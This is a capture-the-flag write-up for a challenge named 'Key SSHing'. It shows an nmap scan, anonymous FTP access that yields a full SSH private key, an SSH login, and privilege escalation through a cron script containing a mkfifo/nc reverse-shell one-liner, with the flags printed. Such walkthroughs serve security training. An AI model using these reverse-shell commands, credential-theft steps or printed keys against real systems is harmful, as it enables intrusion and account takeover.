# Key SSHing

```
This is the ip of the computer of terrorist group CyberPhantoms. Hack into there system and gain any valuable information you can.

128.199.174.243
```

### Soln

- nmap scan result

```bash
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

## FTP anonymous login

- The anonymous login was enabled
- Logged in and `ls -la` gives us .ssh folder
- We had `keys` inside it
  
```bash
ftp> ls
229 Entering Extended Passive Mode (|||53046|)
150 Here comes the directory listing.
-r--r--r--    1 65534    65534        2287 Jan 15 22:28 keys
226 Directory send OK.
ftp> get keys
local: keys remote: keys
229 Entering Extended Passive Mode (|||11295|)
150 Opening BINARY mode data connection for keys (2287 bytes).
100% |************************************************************************************************************************************************|  2287        1.12 MiB/s    00:00 ETA
226 Transfer complete.
2287 bytes received in 00:00 (11.66 KiB/s)
ftp> exit
221 Goodbye.
```

```bash
-----BEGIN OPENSSH PUBLIC KEY-----
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDCoeuN/FUkzJ59sVlYyPrZRz8lLQ+zrhexW39vE6pvnU2xNr0SKc7NWHxE4KR/TCO9/g4G8jei02zu4ZUYZdEF8RipR5/rGp3KQvHnHV+6HE0NBvTkZyHyPCAZJseOSwCtm5MJKgYEyHTx89UpG1/sRO1hSAsH2n61C2VByBFJsMVIK4DV+REXV5F38XjRz+5YVUUfePKDW605OXkQZ8D50nWqCf0vvJKNUefb5oEkQepZOG1VUgNS6oL8XQtPNYHDpHSQJlamXXV5F0Tm84Vu1+GQFrFS8Lk8DAKFoxWB/uITDNcKbtp+4KIvkQ/PmIqG1TEYm+/hvqqvw2gv6STf michael@pwn01
-----END OPENSSH PUBLIC KEY-----

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwqHrjfxVJMyefbFZWMj62Uc/JS0Ps64XsVt/bxOqb51NsTa9EinO
zVh8ROCkf0wjvf4OBvI3otNs7uGVGGXRBfEYqUef6xqdykLx5x1fuhxNDQb05Gch8jwgGS
bHjksArZuTCSoGBMh08fPVKRtf7ETtYUgLB9p+tQtlQcgRSbDFSCuA1fkRF1eRd/F40c/u
WFVFH3jyg1utOTl5EGfA+dJ1qgn9L7ySjVHn2+aBJEHqWThtVVIDUuqC/F0LTzWBw6R0kC
ZWpl11eRdE5vOFbtfhkBaxUvC5PAwChaMVgf7iEwzXCm7afuCiL5EPz5iKhtUxGJvv4b6q
r8NoL+kk3wAAA8jYHceD2B3HgwAAAAdzc2gtcnNhAAABAQDCoeuN/FUkzJ59sVlYyPrZRz
8lLQ+zrhexW39vE6pvnU2xNr0SKc7NWHxE4KR/TCO9/g4G8jei02zu4ZUYZdEF8RipR5/r
Gp3KQvHnHV+6HE0NBvTkZyHyPCAZJseOSwCtm5MJKgYEyHTx89UpG1/sRO1hSAsH2n61C2
VByBFJsMVIK4DV+REXV5F38XjRz+5YVUUfePKDW605OXkQZ8D50nWqCf0vvJKNUefb5oEk
QepZOG1VUgNS6oL8XQtPNYHDpHSQJlamXXV5F0Tm84Vu1+GQFrFS8Lk8DAKFoxWB/uITDN
cKbtp+4KIvkQ/PmIqG1TEYm+/hvqqvw2gv6STfAAAAAwEAAQAAAQAcKafW/LspPv5z+5SN
F0/M3tVRQMrz2e4NuMqgvPy9d8qFKQGEvk3xQquAn+zNiqvlUvyenq/UPLmXe0bCqADt1i
wWWonWUByi5rrwET0Hxg6UIvyOjCnKTk7qtMTNXyby9/73pYAHcyYQ2JJwh0iC/JpIqE8I
TOJmugZl1VhDDDNlv0Z7QbSvAaF/GjYn7z8oa1OdUxaWskq23pk2yI1RtPkRlQmBX/1H+V
Nz4s4nFyxPW+xgPojiRr45svnVLQZgG+SgHTsYR/ZvrpDcz5inEP04kna67Dwh6QKIvA3s
ovgaP1eHhxTR1D7Ql76KL6kz2Fu0/9XB281d1UfXG0ERAAAAgD2upiKV3lkxqE9df3C49o
8Kp+I086JePjL0IkTfv1kQ8sMh1SJh+VScD8at7xnqleSpTiZqAVWPKEZ1kqe/ylLm4x78
jZM78TY8wSeldttYzIpsMVBkS51+4Jq6bhvgRvHt9DA9AMGVqrHowC3e/BEd0hjENqsgjf
fXGTmEDS2nAAAAgQDpel02r4MF35NiW3XZZgYN8ads6FkwnpgYxpb8Mu3ZOOfWg1Tu8hdw
rRs6GtGGMnEy5cWBpohw0CDLK7u5FCcAbyhPoiH1SzbktqtDqEfZdNJA1/YxR1b72DPH69
11SnytTJ2V1vQqFEmx24F3h5LHERC3QDwilseuokI2upqfpwAAAIEA1WhIro9OqKMsdGqW
2roC3KhfnDaegSME7OGbAfhzgSm7me0RkURFyvpNUQucLG4z3GTIsWvr6EgAXugAw3k0XY
DN+a63VDjrJ9Y8lfQtWLQ/cd3ZMkmOeyprxnjgFz/FrOZpl3SvL7QR8NGTYliJ18YsJsUV
ramD+heHkq+rOAkAAAANbWljaGFlbEBwd24wMQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----

```

- now just ssh

```bash
└─➜ nvim id_rsa

└─➜ chmod 400 id_rsa

└─➜ ssh michael@128.199.174.243 -i id_rsa
Last login: Sun Jan 28 07:23:27 2024 from 152.58.31.214
michael@pwn01:~$ ls
linpeas.sh  pspy64  snap  user_flag.txt
michael@pwn01:~$ cat user_flag.txt
tutelr{n07_7h3_fl46_y0u_4r3_l00k1n6_f0r}
```

- This wasn't the flag lol
- no sudo -l

- ran the linpeas

![image](https://github.com/heapbytes/tutelr-ctf-writeups/assets/56447720/453baa7b-aa3b-4843-9250-5415983ab76c)


- ok it's running `message_101` under `/var/tmp` as `sam`
- bingo let's exploit this

```bash
michael@pwn01:/var/tmp$ cat message_101
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f
```

- now start listening on localhost
- `nc -nvlp 4444`

```bash
michael@pwn01:/var/tmp$ nc -nvlp 4444
Listening on 0.0.0.0 4444
Connection received on 127.0.0.1 60430
sh: 0: can't access tty; job control turned off
$ id
uid=1001(sam) gid=1001(sam) groups=1001(sam),100(users)
$ cd
$ ls
flag.txt
message.txt
message_101
$ cat flag.txt
tutelr{1_0wn_y0ur_b0x_k1n6_0f_pr1v35c}
```

#### Pwned





 
